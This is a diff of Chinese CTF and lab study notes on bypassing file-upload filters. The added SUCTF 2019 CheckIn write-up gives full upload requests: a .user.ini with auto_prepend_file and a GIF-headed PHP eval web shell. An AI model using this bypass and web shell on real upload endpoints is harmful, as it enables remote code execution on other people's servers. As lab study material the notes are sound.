@@ -297,7 +297,7 @@ if(isset($_POST['submit'])){
 
 使用`exif_imagetype`函数解析图片文件头，方法仍然可用
 
-
+* **简单方案：**使用`GIF89a?`文件头绕过检测
 
 ## lab 16
 
@@ -608,3 +608,40 @@ if(!empty($_FILES['upload_file'])){
 ```
 
 上传文件位置`upload/`
+
+
+
+### [SUCTF 2019]CheckIn
+
+* 文件后缀检测： `ph*, htaccess`
+
+* 文件内容检测 `exif`文件头 -> GIF文件头绕过
+
+* 上传文件目录存在`index.php` **使用`.user.ini`配置文件绕过**
+
+  * 类似htaccess，配置当前目录，为Fastcgi接口配置文件 （通用于apache/nginx）
+
+  * 如下配置，将在所有php文件解析前，在头部加入指定文件内容（append尾部）
+    ```ini
+    auto_prepend_file=shell.gif
+    ```
+
+1. 上传`.user.ini`
+   ```http
+   Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
+   Content-Type: application/octet-stream
+   
+   GIF89a?
+   auto_prepend_file=shell.gif
+   ```
+
+2. 上传`shell.gif`
+   ```http
+   Content-Disposition: form-data; name="fileUpload"; filename="shell.gif"
+   Content-Type: application/octet-stream
+   
+   GIF89a?
+   <script language="php">eval($_POST['a'])</script>
+   ```
+
+3. 访问目录下`index.php`，生效
